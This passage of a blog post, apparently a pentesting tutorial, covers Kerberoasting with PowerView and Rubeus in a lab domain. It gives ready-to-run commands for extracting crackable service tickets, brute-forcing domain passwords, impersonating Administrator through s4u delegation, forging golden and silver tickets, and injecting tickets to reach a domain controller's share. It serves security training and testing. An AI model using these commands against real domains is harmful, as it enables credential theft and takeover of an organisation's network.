+</span></span><span style="display:flex;"><span>        PS C:\htb&gt; Get-DomainUser * -spn | select samaccountname
+</span></span><span style="display:flex;"><span>        PS C:\htb&gt; Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+</span></span></code></pre></div><p><strong>Target Specific User</strong></p>
+<p><code>Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat</code></p>
+<p><strong>Exporting All Tickets to a CSV file and viewing the Content</strong></p>
+<p><code>Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation</code></p>
+<p><code>cat .\ilfreight_tgs.csv</code></p>
+<h2 id="rebeus">REBEUS<a hidden class="anchor" aria-hidden="true" href="#rebeus">#</a></h2>
+<p><a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
+<p>A tool capable of performing kerberoasting faster and easier by providing a variety of options to interact with kerberos</p>
+<p><a href="https://www.hackingarticles.in/a-detailed-guide-on-rubeus/">https://www.hackingarticles.in/a-detailed-guide-on-rubeus/</a></p>
+<h3 id="ticket-operations"><strong>Ticket Operations</strong><a hidden class="anchor" aria-hidden="true" href="#ticket-operations">#</a></h3>
+<p>Working in an Active Directory environment depends on various tickets. For example, a Ticket Granting Ticket is an authentication token issued by the KDC which is used to request access from TGS for specific resources.</p>
+<p>In this section, we’ll talk about Rubeus and its capability to play around with tickets.</p>
+<h4 id="asktgt">Asktgt<a hidden class="anchor" aria-hidden="true" href="#asktgt">#</a></h4>
+<p>Rubeus can generate raw AS-REQ traffic in order to ask for a TGT with a provided username and password. The password can also be encrypted in RC4, AES or DES encryption and it would still work. Let’s see an example where a clear-text password is supplied</p>
+<p><code>rubeus.exe asktgt /user:harshitrajpal /password: Password@1</code></p>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoZ7cs-QGTlKd5Bzpz77QkG6O6Fi72ldE6ow6UL-XPUd9C67hSeOJi9oqI3KMjzHTeXnrzsh4gfW3_YzzHX-Vo79aphiKA-HUtp49i8dnjHouPnzQQ1Jiwjr9VToCj5KtwWhqgKICUBgw2CTYT47tQELkP85ZBab2vugzQn6WmCr5hj5uZMJ-dITJOhg/s16000/7.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoZ7cs-QGTlKd5Bzpz77QkG6O6Fi72ldE6ow6UL-XPUd9C67hSeOJi9oqI3KMjzHTeXnrzsh4gfW3_YzzHX-Vo79aphiKA-HUtp49i8dnjHouPnzQQ1Jiwjr9VToCj5KtwWhqgKICUBgw2CTYT47tQELkP85ZBab2vugzQn6WmCr5hj5uZMJ-dITJOhg/s16000/7.png?w=640&amp;amp;ssl=1"  />
+</p>
+<p>As you can see above that a KRBTGT has been successfully generated which can be further used to generate TGS. The same can be achieved by providing an encrypted password. Let’s use a password encrypted with the RC4 cipher.</p>
+<p><code>rubeus.exe asktgt /user:harshitrajpal /rc4:64FBAE31CC352FC26AF97CBDEF151E03</code></p>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6vfMUCFomJiyWrerwcZuM3nwQpfznhLsINzT8AiGJoXTgS0g42p3tERFo0ub34PI3SLF_XLstk_lq9rrbJE4Vjq6Wfvdho0Ntfs870KbT5wB9Mxk-vHTcAht8sC4fkWmU5YV_0BkOm5ILs9gJ8Nq6euvG-wncjJMfoaTn1fc5MpmzXNXSTjmm2JPc4g/s16000/8.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6vfMUCFomJiyWrerwcZuM3nwQpfznhLsINzT8AiGJoXTgS0g42p3tERFo0ub34PI3SLF_XLstk_lq9rrbJE4Vjq6Wfvdho0Ntfs870KbT5wB9Mxk-vHTcAht8sC4fkWmU5YV_0BkOm5ILs9gJ8Nq6euvG-wncjJMfoaTn1fc5MpmzXNXSTjmm2JPc4g/s16000/8.png?w=640&amp;amp;ssl=1"  />
+</p>
+<p><strong>Asktgs</strong></p>
+<p>Rubeus has an asktgs option which can build raw TGS-REP requests by providing a ticket either in the CLI argument or by providing a path to a ticket.kirbi file placed on disk. Each TGS has a specified purpose.</p>
+<p>For example, let’s create a TGS for the LDAP service. One or more service SPNs can be provided.</p>
+<p><code>rubeus.exe asktgs /user:harshitrajpal /ticket:doIFNDCCBTCgAwIBB...bA== /service:LDAP/dc1.ignite.local</code>         <br>
+<img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMI6bD_rWmk3OnNX-A2fyRHpOAOuMB9C_79YtSoJITgwK-vMjtkrKnt8HmLMzt6zM0amwmzw8khiMatpV1CW9XCCRjp-1qhcbIWxz3yDZFfNs04v3DGllEd0ZROjkRqwd1ghVF3WbPCfx6HReUAb67OMvMV7IKrIl4zIa5oEwoIwTjRHSO5EJcNCqPIg/s16000/9.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMI6bD_rWmk3OnNX-A2fyRHpOAOuMB9C_79YtSoJITgwK-vMjtkrKnt8HmLMzt6zM0amwmzw8khiMatpV1CW9XCCRjp-1qhcbIWxz3yDZFfNs04v3DGllEd0ZROjkRqwd1ghVF3WbPCfx6HReUAb67OMvMV7IKrIl4zIa5oEwoIwTjRHSO5EJcNCqPIg/s16000/9.png?w=640&amp;amp;ssl=1"  />
+</p>
+<p>By providing in the TGT we generated in the previous step (copying in notepad and removing enters to type the ticket in a single line) we have generated a TGS successfully.</p>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZIVjHBOo3oUV7kNLe-E4sPeFKTAwW2e0nUV2BxXFxZ2R_Bni2LUjvkiKIL6o0Ugfs_S5N2Q8f383lwlGR0ZYYEcY0VNeha3W0UHtCM8-LaYDxBDWL8GUww5gK3Bb29OUr5U5FB2trJ4h7A3hJEP6BGlNBjcmbBBnaQ2pGfA1Yq7d0REz4DLydwjMjcw/s16000/10.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZIVjHBOo3oUV7kNLe-E4sPeFKTAwW2e0nUV2BxXFxZ2R_Bni2LUjvkiKIL6o0Ugfs_S5N2Q8f383lwlGR0ZYYEcY0VNeha3W0UHtCM8-LaYDxBDWL8GUww5gK3Bb29OUr5U5FB2trJ4h7A3hJEP6BGlNBjcmbBBnaQ2pGfA1Yq7d0REz4DLydwjMjcw/s16000/10.png?w=640&amp;amp;ssl=1"  />
+</p>
+<h3 id="klist">Klist<a hidden class="anchor" aria-hidden="true" href="#klist">#</a></h3>
+<p>Klist command in Windows can be used to view the tickets generated in the system. Here, when we run klist command we can see that a KRBTGT and an LDAP TGS have been generated and stored in the session.</p>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXmMQ3Twpy5cfkNrwiuysEB9XtIXh5Onuq41Bmss3tO8zzDskS2mgte_KiIvRlPd_RyXr0MAFRP1tuBCkp4nZsAnXwW_gvyP0Fc0LsftC28dDE-V4DQIGExLvnrGD37LUhlyzROJIrdVf4hBDa0HNFhlZzjLIzQfedFGmAA3UzYsbDNPP-7dSmT2mL3w/s16000/11.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXmMQ3Twpy5cfkNrwiuysEB9XtIXh5Onuq41Bmss3tO8zzDskS2mgte_KiIvRlPd_RyXr0MAFRP1tuBCkp4nZsAnXwW_gvyP0Fc0LsftC28dDE-V4DQIGExLvnrGD37LUhlyzROJIrdVf4hBDa0HNFhlZzjLIzQfedFGmAA3UzYsbDNPP-7dSmT2mL3w/s16000/11.png?w=640&amp;amp;ssl=1"  />
+</p>
+<h3 id="renew">Renew<a hidden class="anchor" aria-hidden="true" href="#renew">#</a></h3>
+<p>The renew function in Rubeus builds a TGT renewal exchange. We can specify a domain controller using the /dc flag which will be used as a destination for the renewal traffic. We can further use the <strong>tgtdeleg</strong> option with this and extract user’s credentials without elevation and keep it alive on another system for a week by default.</p>
+<p><strong>/ptt</strong> flag can also be used in conjunction to apply the Kerberos</p>
+<p><code>rubeus.exe renew /dc:dc1.ignite.local /ticket:doIFNDCCB....bA==</code></p>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi0GpSeTg61s0HWOXUHdRK5JkiFgSUmbHE6Hu8QPFINoVu4eEqrhwjcHgkE1N0vy8W_JenfEymZ7Wuzom7DSJ6SB_4A-t6xhhM3YXnM8gN0gu8AVq1yI0boCr_kPi_igdmkLF6SXz_42IPOR0qLwkAk6TffeJVnoZkAvNtc6zcQaccR5YRLVheZyn2dfQ/s16000/12.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi0GpSeTg61s0HWOXUHdRK5JkiFgSUmbHE6Hu8QPFINoVu4eEqrhwjcHgkE1N0vy8W_JenfEymZ7Wuzom7DSJ6SB_4A-t6xhhM3YXnM8gN0gu8AVq1yI0boCr_kPi_igdmkLF6SXz_42IPOR0qLwkAk6TffeJVnoZkAvNtc6zcQaccR5YRLVheZyn2dfQ/s16000/12.png?w=640&amp;amp;ssl=1"  />
+</p>
+<p><strong>/autorenew</strong> sub-function will put the exchange to sleep for endTime 30 minutes and after that window automatically renew the TGT and display the renewed ticket</p>
+<p><code>rubeus.exe renew /dc:dc1.ignite.local /autorenew /ticket:doIFNDCCBTCgAw...bA==</code></p>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirxuh_4JAood6FK5wMIFjbbs0mBlJXHHg46gL0FKhJWDkjDN3w9wfsBIexmRzJAtlxXozcTEeCVpU6C46ls0Pfp71GSt6jQTo9ma5H7Vph83B8TsK9lpiHim6VtnmtHOxxdXiLt1dEorn2IWthB-ugOAgUBNXAmseTdzwrlN7MjsNfuW6mQAsP8Y3FJw/s16000/14.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirxuh_4JAood6FK5wMIFjbbs0mBlJXHHg46gL0FKhJWDkjDN3w9wfsBIexmRzJAtlxXozcTEeCVpU6C46ls0Pfp71GSt6jQTo9ma5H7Vph83B8TsK9lpiHim6VtnmtHOxxdXiLt1dEorn2IWthB-ugOAgUBNXAmseTdzwrlN7MjsNfuW6mQAsP8Y3FJw/s16000/14.png?w=640&amp;amp;ssl=1"  />
+</p>
+<p>As you may now observe that after a specified time interval a renewed TGT is shown</p>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9bgCsSYADAltUs7Q3vRTfTZDSOf9wRunhlIc3WNMZQChVO_iVgdHe8bCNACLVVLt4o4Ewk9U78KMJ3wiuwYiQGmsuWgp0W6T3wLYBVOKmBS7VZjRBPxEZJs_Tx-slKrZI9fPJxIKrhQXu7tbQR3966yrXxlLgVFsOFzb-zOtRAhv2U4Wb1xoa9HuNxQ/s16000/15.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9bgCsSYADAltUs7Q3vRTfTZDSOf9wRunhlIc3WNMZQChVO_iVgdHe8bCNACLVVLt4o4Ewk9U78KMJ3wiuwYiQGmsuWgp0W6T3wLYBVOKmBS7VZjRBPxEZJs_Tx-slKrZI9fPJxIKrhQXu7tbQR3966yrXxlLgVFsOFzb-zOtRAhv2U4Wb1xoa9HuNxQ/s16000/15.png?w=640&amp;amp;ssl=1"  />
+</p>
+<p><strong>Brute</strong></p>
+<p>The brute option in Rubeus can be used to perform a password bruteforce attack against all the existing user accounts in Active Directory. Many times, the same password is used with multiple accounts in real-life enterprise infrastructure. So, brute option can generate multiple TGTs in those accounts having the same password. /noticket can be used in conjunction with this option since no ticket is provided with this functionality. For example,</p>
+<p><code>rubeus.exe brute /password:Password@1 /noticket</code></p>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8INMtJE1du0EspNXMj77ZWTFOnXpqubTigbJ7OEAxdyYRsYdzmFOJ6-4TC9981a5sSh1gSumtK8toDQRacSx-xpU2atrsKCEmiXTlzVuc-WEDEfA_JGRDYtF14fyCnh9rpUCKBdyVKWzgX7BauXZv9MNt-_w1XmV8xOiuN4ZaLpQmy_5xzuuxZDvivA/s16000/16.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8INMtJE1du0EspNXMj77ZWTFOnXpqubTigbJ7OEAxdyYRsYdzmFOJ6-4TC9981a5sSh1gSumtK8toDQRacSx-xpU2atrsKCEmiXTlzVuc-WEDEfA_JGRDYtF14fyCnh9rpUCKBdyVKWzgX7BauXZv9MNt-_w1XmV8xOiuN4ZaLpQmy_5xzuuxZDvivA/s16000/16.png?w=640&amp;amp;ssl=1"  />
+</p>
+<p><strong>Hash</strong></p>
+<p>Rubeus is capable of taking in passwords and generating hashes of them. These are of different formats including NTLM (rc4_hmac) hash. To do this, we can use a <strong>hash</strong> function and provide a domain using /domain, an account’s name (can be a machine account too) using the/user flag and the password using /password.</p>
+<p><code>rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1</code></p>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZwNam6iqN9HFpOVruPYUbfV6Fv4Jdy5rhK3M5jh0bC0T8fCyiuaBZGICX4VpQMH8VgHtHC-W_xc75J_k3fc9VlCPhPjJAwrAYd2EjRxisDx0J7AA0RVzq8v1QSHG9EBQ_vKxFfwqIN8UxppwBCl4X6AlqH31yo_kUhXtwIoC6FMMXQjdIxkj4RM_RXA/s16000/17.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZwNam6iqN9HFpOVruPYUbfV6Fv4Jdy5rhK3M5jh0bC0T8fCyiuaBZGICX4VpQMH8VgHtHC-W_xc75J_k3fc9VlCPhPjJAwrAYd2EjRxisDx0J7AA0RVzq8v1QSHG9EBQ_vKxFfwqIN8UxppwBCl4X6AlqH31yo_kUhXtwIoC6FMMXQjdIxkj4RM_RXA/s16000/17.png?w=640&amp;amp;ssl=1"  />
+</p>
+<p>As you can see 4 different hashes have been output. Various encryption ciphers are used in conjunction with popular hashing techniques. All of these ciphers are supported in AD environment and hence, may be used for different purposes.</p>
+<p><strong>S4u</strong></p>
+<p>We saw above how we can generate hashes using Rubeus. Now let’s talk about one such attack where hashes can be used to impersonate another user and carry out delegation attacks. For a detailed write-up on delegation, and attacks follow the link <strong><a href="https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/">here</a></strong>. In short, OS post-Windows server 2003 contained a Kerberos protocol extension called s4uself and s4uproxy. These protocols can be used to conduct delegation attacks. For example, in the example below, we have performed an attack called “Resource-Based Constrained Delegation” which benefits the <strong>msDS-AllowedToActOnBehalfOfAnotherIdentity</strong> option set in the attribute’s editor. Follow the article <strong><a href="https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/">here</a></strong> for a full attack. In the example below, we’ll use the user noob’s hash and then impersonate Administrator account.</p>
+<ul>
+<li>
+<p>/rc4: flag is used to provide user noob’s account.</p>
+</li>
+<li>
+<p>/impersonateuser: User that will be impersonated by noob.</p>
+</li>
+<li>
+<p>/msdsspn: A valid msDS-AllowedToActOnBehalfOfAnotherIdentity value for the account. Here, the domain controller</p>
+</li>
+<li>
+<p>/altservice: can be supplied to substitute one or more service names in the resulting .kirbi file.</p>
+</li>
+<li>
+<p>/ptt: Injects the resulting ticket in the current terminal session</p>
+</li>
+</ul>
+<p><code>rubeus.exe s4u /user:noob$ /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /impersonateuser:Administrator /msdsspn:host/dc1.ignite.local /altservice:cifs /domain:ignite.local /ptt</code></p>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKaBMUp5U77qh_6bLSEV5bfowSgiBZUnNH2RVGlwxy6mUTG9N64BCvW5gcbsu6DIUNQ2Y3AmFBysTZZBbaXsZSivH7JAfNBMHVF9NjFyNc3_6qdjTyVa2Oh5Y3lkzvTMlMV0NptR-PLeyvgEPczWZdi1gf_AhJm9H_3vq1zXG_68zKek31PTNhtK5QDw/s16000/18.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKaBMUp5U77qh_6bLSEV5bfowSgiBZUnNH2RVGlwxy6mUTG9N64BCvW5gcbsu6DIUNQ2Y3AmFBysTZZBbaXsZSivH7JAfNBMHVF9NjFyNc3_6qdjTyVa2Oh5Y3lkzvTMlMV0NptR-PLeyvgEPczWZdi1gf_AhJm9H_3vq1zXG_68zKek31PTNhtK5QDw/s16000/18.png?w=640&amp;amp;ssl=1"  />
+</p>
+<p>This would generate a ticket for Administrator user over the specified SPN. In short, we can now act as DC.</p>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUB3Gg2Pl5L3PtqMzd7Q7xa8K50p7yK8r3YqVEj5VgHAcAClYIFIwE4kiN-UcO58nHkB5BjLOOtlEAAIcd86f0oq3_I6K2XCmjkFVZnjDUggjoiycvgi9tOn-iuZ1FeiJY4BoxpP2dfMdC7xFQH7vpG-ahmBvjzVP1_QE6Hlv-LjJqBDnqkIi03zzb6A/s16000/19.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUB3Gg2Pl5L3PtqMzd7Q7xa8K50p7yK8r3YqVEj5VgHAcAClYIFIwE4kiN-UcO58nHkB5BjLOOtlEAAIcd86f0oq3_I6K2XCmjkFVZnjDUggjoiycvgi9tOn-iuZ1FeiJY4BoxpP2dfMdC7xFQH7vpG-ahmBvjzVP1_QE6Hlv-LjJqBDnqkIi03zzb6A/s16000/19.png?w=640&amp;amp;ssl=1"  />
+</p>
+<h3 id="golden-ticket">Golden Ticket<a hidden class="anchor" aria-hidden="true" href="#golden-ticket">#</a></h3>
+<p>Golden tickets are forged KRBTGTs (Key Distribution Service account) which can be used to forge other TGTs. This provides an attacker persistence over the domain accounts. For a detailed walkthrough on the topic you can visit the article <strong><a href="https://www.hackingarticles.in/domain-persistence-golden-ticket-attack/">here</a></strong>.</p>
+<p>To forge a golden ticket for user harshitrajpal, we first generate an AES hash (RC4 works too) using the hash command in Rubeus and then using the golden function like so. Here,</p>
+<ul>
+<li>
+<p>/ldap: Retrieves information of user over LDAP protocol</p>
+</li>
+<li>
+<p>/user: Username whose ticket will be forged</p>
+</li>
+<li>
+<p>/printcmd: displays a one liner command that can be used to generate the ticket again that just got generated</p>
+</li>
+</ul>
+<p><code>rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1</code></p>
+<p><code>rubeus.exe golden /aes256:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:harshitrajpal /printcmd</code></p>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPW0OyVNb9deU4qubrM9AEjoOx7201V4pamhV-2Mru0bgQtPYpuvLlJkuOKv4V4mm0Oev2mb8XOF3JccaoZz3xtI5l8psPzgyrBbsYNB8lN3BjcNIVbbiit7B6-ly-ba4JeQ_aKuWgmQp_Vlwgiopb3z763jc82mW25GyqIOdhlWEV8YtqKGQsI6GQVA/s16000/20.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPW0OyVNb9deU4qubrM9AEjoOx7201V4pamhV-2Mru0bgQtPYpuvLlJkuOKv4V4mm0Oev2mb8XOF3JccaoZz3xtI5l8psPzgyrBbsYNB8lN3BjcNIVbbiit7B6-ly-ba4JeQ_aKuWgmQp_Vlwgiopb3z763jc82mW25GyqIOdhlWEV8YtqKGQsI6GQVA/s16000/20.png?w=640&amp;amp;ssl=1"  />
+</p>
+<p>As you can see various details like SID, userID, Service Key etc are being fetched over LDAP which are important to generate a ticket. PAC signing is also done and a TGT generated for harshitrajpal</p>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxY76i8rRENeczKVXlyQt-PAGh-qYsRVlpB7wJe-Up8Xnkv6aBrdlB7CQVFsBFznkq015OPZG3Y77ndDEAnQ2UsV4zmdzEONj1lJaf2NcJvg7TaOgE31UHNMER3COPjpOHUuu3XfwgQmdB4WcYn_sXi4bHMITqEbMghPGGrvs4pHHshPb-WnJKFr15VA/s16000/21.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxY76i8rRENeczKVXlyQt-PAGh-qYsRVlpB7wJe-Up8Xnkv6aBrdlB7CQVFsBFznkq015OPZG3Y77ndDEAnQ2UsV4zmdzEONj1lJaf2NcJvg7TaOgE31UHNMER3COPjpOHUuu3XfwgQmdB4WcYn_sXi4bHMITqEbMghPGGrvs4pHHshPb-WnJKFr15VA/s16000/21.png?w=640&amp;amp;ssl=1"  />
+</p>
+<p>Also, at the end you’ll see a one liner command that can be used to generate this TGT again.</p>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfywgxE1QC5yHtbQrFXEPtYWOTQCW2-OvfyCFEcnV3kZX4O_HwPo1OK0pF-fN_TqCpzYuChAht98oyoZWFgawOvvrN6phmhaqcd_rhEscMJs6x2FLcjdFTwf6i2mUoaVwXwP9z_liDl9Y7O3eB7_YoRVJm5o42LcnjkS5-JFhYoyRv_219ADE8Zd-mnQ/s16000/22.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfywgxE1QC5yHtbQrFXEPtYWOTQCW2-OvfyCFEcnV3kZX4O_HwPo1OK0pF-fN_TqCpzYuChAht98oyoZWFgawOvvrN6phmhaqcd_rhEscMJs6x2FLcjdFTwf6i2mUoaVwXwP9z_liDl9Y7O3eB7_YoRVJm5o42LcnjkS5-JFhYoyRv_219ADE8Zd-mnQ/s16000/22.png?w=640&amp;amp;ssl=1"  />
+</p>
+<p>Various other options can be used in conjunction with golden to modify the generated TGT like:</p>
+<ul>
+<li>
+<p>/rangeinterval: After every time specified, a new ticket will be generated.</p>
+</li>
+<li>
+<p>/rangeend: Specifies the maximum time tickets will be generated for. Here, 5 days. Since rangeinterval is 1d, 5 different tickets will be generated.</p>
+</li>
+</ul>
+<p>For a full list of modifications, see <a href="https://github.com/GhostPack/Rubeus#ticket-forgery">this</a> page.</p>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUypE_lTmt2yK73cZqzgsmQQNTlCV36mrTI6qA649BmStnd2VqKiA8VYyUPv6hJTM-qGOBzoeTDZ11TDCeAZrjJVNsaSkBSDHDiFU_RQEEywN-i8bA9II87KdJjC1zdo7ekO1CxpuuNA9sSlz5L-5QfhKXLmPzYasAgLoCiD9ygPjc8lF3n4wn9oZWzQ/s16000/23.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUypE_lTmt2yK73cZqzgsmQQNTlCV36mrTI6qA649BmStnd2VqKiA8VYyUPv6hJTM-qGOBzoeTDZ11TDCeAZrjJVNsaSkBSDHDiFU_RQEEywN-i8bA9II87KdJjC1zdo7ekO1CxpuuNA9sSlz5L-5QfhKXLmPzYasAgLoCiD9ygPjc8lF3n4wn9oZWzQ/s16000/23.png?w=640&amp;amp;ssl=1"  />
+</p>
+<h3 id="silver-ticket">Silver Ticket<a hidden class="anchor" aria-hidden="true" href="#silver-ticket">#</a></h3>
+<p>Silver tickets are forged Kerberos Ticket Granting Service (TGS) Tickets but with silver tickets there is no communication with the domain controller. It is signed by the service account configured with an SPN for each server the Kerberos-authenticating service runs on. For more details visit the page <strong><a href="https://adsecurity.org/?p=2011">here</a></strong>.</p>
+<p>Silver ticket attack can be performed using Rubeus using silver function. Other customisations need be made like:</p>
+<ul>
+<li>
+<p>/service: SPN of the service ticket is being generated for</p>
+</li>
+<li>
+<p>/rc4: Hash of a valid user (harshitrajpal here) which will be used to encrypt the generated ticket</p>
+</li>
+<li>
+<p>/user: username of the user whose hash is provided</p>
+</li>
+<li>
+<p>/creduser: User to be impersonated</p>
+</li>
+<li>
+<p>/credpassword: Password of the user to be impersonated</p>
+</li>
+<li>
+<p>/krbkey: used to create the KDCChecksum and TicketChecksum. This is the AES256 hmac sha1 hash in the following case.</p>
+</li>
+<li>
+<p>/krbenctype: type of encrypted hash used. Aes256 here.</p>
+</li>
+</ul>
+<p><code>rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1</code></p>
+<p><code>rubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ignite.local\Administrator /credpassword:Ignite@987 /user:harshitrajpal /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ignite.local /ptt</code></p>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisS0kDD040twsfat2VTDk5Vb0CHVG5Ho8l7jvHce-9bDMM8q0bKmcZS-Mft-uYxbjVHPPvftsC-fmkKmWH7JKLW7gp9OhKSsh64nwt597z00_UyhrzIsbxvWYysVr2DFj__o88gbUKXoiH8ghDmX1nttn9j0URoOF8avXUSyibjLTmYWLBDAPgqIPFHA/s16000/24.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisS0kDD040twsfat2VTDk5Vb0CHVG5Ho8l7jvHce-9bDMM8q0bKmcZS-Mft-uYxbjVHPPvftsC-fmkKmWH7JKLW7gp9OhKSsh64nwt597z00_UyhrzIsbxvWYysVr2DFj__o88gbUKXoiH8ghDmX1nttn9j0URoOF8avXUSyibjLTmYWLBDAPgqIPFHA/s16000/24.png?w=640&amp;amp;ssl=1"  />
+</p>
+<p>This helped us generate a silver ticker for Administrator account. And as a result, we are now able to access DC machine’s C drive</p>
+<p><code>dir \\dc1.ignite.local\c$</code>             <br>
+<img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXSuXCGmt8xKSiStl62a7d-U4QriyKnr09ulubQzP_4Xb3qvrtuswXkVm6d2JnRe2wW-fJCXEFZmwy-DYtS5tivoUszspE8U0tMbNs2MbnVW1rTihlWrJdQp_RlmtBhL2eIx_TwHPSn3wgsq1UfhhoPB9zY3zRsV77ZmCYZB-C8p510xPjbnutXcFNDA/s16000/25.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXSuXCGmt8xKSiStl62a7d-U4QriyKnr09ulubQzP_4Xb3qvrtuswXkVm6d2JnRe2wW-fJCXEFZmwy-DYtS5tivoUszspE8U0tMbNs2MbnVW1rTihlWrJdQp_RlmtBhL2eIx_TwHPSn3wgsq1UfhhoPB9zY3zRsV77ZmCYZB-C8p510xPjbnutXcFNDA/s16000/25.png?w=640&amp;amp;ssl=1"  />
+</p>
+<h3 id="ticket-management">Ticket Management<a hidden class="anchor" aria-hidden="true" href="#ticket-management">#</a></h3>
+<p>Rubeus contains multiple ticket management options that may aid a pentester to conduct operations effectively and stealthily. As a pentester, we need to manage our generated tickets.</p>
+<p><strong>Ptt</strong></p>
+<p>The Rubeus ptt option can import the supplied ticket in command line. The /ptt can also be used in conjunction with other options that output tickets. For example,</p>
+<p><code>rubeus.exe ptt /ticket:doIFNDCCBTCgAwI...bA==</code></p>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKTVmohjirCZfdaG4GGv7-wzWMuQ58Q1_TCFHqBRpx9oRXWvvKAnWSir3Eh6VFwNFbwjPW2owjtkj25OSt2QZtX91OHITOdFbYToEfxgKkchxA1hhppI0_GbkGZKvhobYRcJMR_n8eN_SX67_x-GS_u_mqEhba24FoFO6tjr1I3p2p6xsd1uaI8H2kEA/s16000/26.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKTVmohjirCZfdaG4GGv7-wzWMuQ58Q1_TCFHqBRpx9oRXWvvKAnWSir3Eh6VFwNFbwjPW2owjtkj25OSt2QZtX91OHITOdFbYToEfxgKkchxA1hhppI0_GbkGZKvhobYRcJMR_n8eN_SX67_x-GS_u_mqEhba24FoFO6tjr1I3p2p6xsd1uaI8H2kEA/s16000/26.png?w=640&amp;amp;ssl=1"  />
+</p>
+<p>As you can see, the generated ticket has now been imported.</p>
+<p><strong>Purge</strong></p>
+<p>Rubeus has a purge option which can purge/delete all the tickets existing in the current session.</p>
+<p>Here, we demonstrate how we purged 2 tickets listed by klist.</p>
+<p><code>rubeus.exe purge</code></p>
